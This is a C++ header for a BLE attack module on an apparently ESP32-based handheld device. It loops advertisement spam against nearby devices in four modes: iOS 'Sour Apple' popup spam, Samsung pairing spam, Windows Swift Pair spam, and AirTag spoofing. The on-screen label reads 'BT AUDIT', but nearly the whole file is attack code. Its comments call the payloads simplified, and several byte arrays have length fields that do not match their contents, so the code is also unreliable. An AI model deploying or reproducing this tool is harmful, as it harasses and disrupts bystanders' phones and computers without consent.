#ifndef BLE_TOOLS_H
#define BLE_TOOLS_H

#include <NimBLEDevice.h>
#include "config.h"

extern TFT_eSPI tft;

// Tool Types
enum BLEToolType {
    SOUR_APPLE,
    SAMSUNG_SPAM,
    SWIFT_PAIR,
    AIRTAG_SPOOF
};

class BLETools {
public:
    void init() {
         NimBLEDevice::init("TechBot"); // Random name later
         pServer = NimBLEDevice::createServer();
         pAdvertising = NimBLEDevice::getAdvertising();
    }

    void runAttack(BLEToolType type) {
        tft.fillScreen(TFT_MAGENTA);
        tft.setTextColor(TFT_WHITE, TFT_MAGENTA);
        tft.setCursor(0, 0);
        tft.print("BT AUDIT: ");
        
        bool running = true;
        while(running) {
             if (digitalRead(BTN_SELECT) == LOW) { running = false; break; }

             switch(type) {
                 case SOUR_APPLE:
                    tft.setCursor(0, 20); tft.println("iOS Ble Spam...");
                    executeSourApple(); 
                    break;
                 case SAMSUNG_SPAM:
                    tft.setCursor(0, 20); tft.println("Samsung/Android...");
                    executeSamsung();
                    break;
                 case SWIFT_PAIR:
                    tft.setCursor(0, 20); tft.println("Windows SwiftPair...");
                    executeSwiftPair();
                    break;
                 case AIRTAG_SPOOF:
                    tft.setCursor(0, 20); tft.println("Airtag Spoof...");
                    executeAirtagSpoof();
                    break;
             }
             delay(100); 
        }
        
        pAdvertising->stop();
        tft.fillScreen(TFT_BLACK);
    }

private:
    NimBLEServer* pServer;
    NimBLEAdvertising* pAdvertising;

    void executeSourApple() {
        // iOS Continuity / Popups
        // List of known popup payloads (shortened for brevity)
        uint8_t advData[] = {0x02, 0x01, 0x06, 0x1A, 0xFF, 0x4C, 0x00, 0x02, 0x15}; 
        // Real implementation cycles through ~20 different payloads
        // Simplified here to single packet spam
        
        NimBLEAdvertisementData oAdvertisementData = NimBLEAdvertisementData();
        oAdvertisementData.addData((uint8_t*)advData, sizeof(advData));
        pAdvertising->setAdvertisementData(oAdvertisementData);
        pAdvertising->start();
        delay(200);
        pAdvertising->stop();
    }

    void executeSamsung() {
        // Samsung Watch Pairing
        uint8_t samsungData[] = {0x02, 0x01, 0x06, 0x1B, 0xFF, 0x75, 0x00, 0x42, 0x09, 0x81, 0x02, 0x14, 0x15, 0x03, 0x21, 0x01, 0x09};
        NimBLEAdvertisementData oAdvertisementData = NimBLEAdvertisementData();
        oAdvertisementData.addData((uint8_t*)samsungData, sizeof(samsungData));
        pAdvertising->setAdvertisementData(oAdvertisementData);
        pAdvertising->start();
        delay(200);
        pAdvertising->stop();
    }

    void executeSwiftPair() {
        // Microsoft Swift Pair
        uint8_t swiftData[] = {0x02, 0x01, 0x06, 0x04, 0xFF, 0x06, 0x00, 0x03, 0x00, 0x80}; // Simplified
        NimBLEAdvertisementData oAdvertisementData = NimBLEAdvertisementData();
        oAdvertisementData.addData((uint8_t*)swiftData, sizeof(swiftData));
        pAdvertising->setAdvertisementData(oAdvertisementData);
        pAdvertising->start();
        delay(200);
        pAdvertising->stop();
    }
    
    void executeAirtagSpoof() {
        // Apple Airtag Spoof (Manufacturer Data 0x4C00 + payload)
        // Simplified static payload
        uint8_t airtagData[] = {0x02, 0x01, 0x06, 0x1A, 0xFF, 0x4C, 0x00, 0x12, 0x19, 0x10, 
                                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
                                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
        // Randomize some bytes?
        airtagData[10] = random(0, 255);
        
        NimBLEAdvertisementData oAdvertisementData = NimBLEAdvertisementData();
        oAdvertisementData.addData(airtagData, sizeof(airtagData)); // Correct usage
        pAdvertising->setAdvertisementData(oAdvertisementData);
        pAdvertising->start();
        delay(200);
        pAdvertising->stop();
    }
};

extern BLETools bleTools;

#endif
